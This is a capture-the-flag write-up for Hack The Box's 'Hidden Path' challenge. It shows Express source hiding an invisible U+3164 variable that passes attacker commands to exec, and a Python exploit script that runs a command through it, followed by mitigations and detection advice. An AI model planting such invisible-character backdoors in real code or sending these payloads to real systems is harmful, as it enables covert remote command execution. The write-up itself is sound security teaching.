---
challenge: Hidden Path
category: Misc
type: Misc
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [misc, javascript, unicode, backdoor, rce]
---

# Hidden Path — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no real flags.

## TL;DR

An Express app only runs commands from a fixed list, but the code carries an **invisible parameter**: `const { choice,ㅤ} = req.body;` plus a trailing comma in the `commands` array with the same variable. The character is `U+3164` (HANGUL FILLER), a valid JavaScript identifier that looks exactly like a space. Sending `choice=6` and `ㅤ=<command>` runs the chosen command.

## Brief and surface

- Misc, Easy; Business CTF 2024.
- Ships `app.js` source and a web instance.
- The story mentions a backdoor in a system check endpoint.

## Recon

```bash
curl -s http://<IP>:<PORT>/ | head
```

The page loads radio buttons and a `submitCommand()` that POSTs to `/server_status` with `choice=<index>`. The server replies with the command output.

## Source analysis

```js
app.post('/server_status', async (req, res) => {
    const { choice,ㅤ} = req.body;
    const integerChoice = +choice;
    if (isNaN(integerChoice)) {
        return res.status(400).send('Invalid choice: must be a number');
    }

    const commands = [
        'free -m',
        'uptime',
        'iostat',
        'mpstat',
        'netstat',
        'ps aux',ㅤ
    ];

    if (integerChoice < 0 || integerChoice >= commands.length) {
        return res.status(400).send('Invalid choice: out of bounds');
    }

    exec(commands[integerChoice], (error, stdout) => { ... });
});
```

A normal editor shows a trailing comma and a space; in reality there is a variable named `ㅤ` in the destructuring and again as the last array element. The trailing comma is valid JavaScript, so the array holds **7** elements and index 6 is reachable.

## The bug

The design tries to stop command injection by sending indexes instead of strings, but the hidden variable breaks that premise: the client controls the seventh array element. The bounds check uses `commands.length`, which already includes the injected element.

## Local reproduction

```bash
npm install express
node app.js
```

The bug reproduces with the same POST; the remote instance is not needed to validate index 6.

## Exploitation

```python
import requests

url = "http://<IP>:<PORT>/server_status"
data = {
    "choice": 6,
    "\u3164": "cat /flag*.txt"   # HANGUL FILLER
}
print(requests.post(url, data=data).text)
```

- `choice=6` passes the bounds check because the array is 7 long.
- The body carries the `ㅤ` key with the command; Express hands it to `req.body` and the destructuring binds it.
- `exec` runs it and returns `stdout`.

The exact endpoint comes from the source (`/server_status`); some copies of the writeup use another path, but `app.post` is the reference.

## Evidence

- A request with `choice=6` and the `\u3164` key.
- Command output in the HTTP response.
- Flag kept in `private/`.

## Lessons learned

- **Invisible characters**: `U+3164` is invisible in most editors; check the hexdump or enable Unicode highlighting.
- **Copy and paste**: recreating the payload loses the character easily; sending `\u3164` avoids it.
- **Trailing comma**: not an error in JS, and here it is the hint that there is one extra element.

## Mitigations and detection

- Never build command lists from `req.body` variables; use constants and an explicit index → command mapping.
- Validate the body against a strict schema (numeric `choice` and nothing else) and reject unknown keys.
- Detection: bodies with keys that are not printable ASCII, or executed commands whose index is absent from the published list; run a linter that flags non-ASCII characters.

## References

- <https://github.com/hackthebox/business-ctf-2024/tree/main/misc/%5BEasy%5D%20Hidden%20Path>
- <https://certitude.consulting/blog/en/invisible-backdoor/>
- <https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_misc>
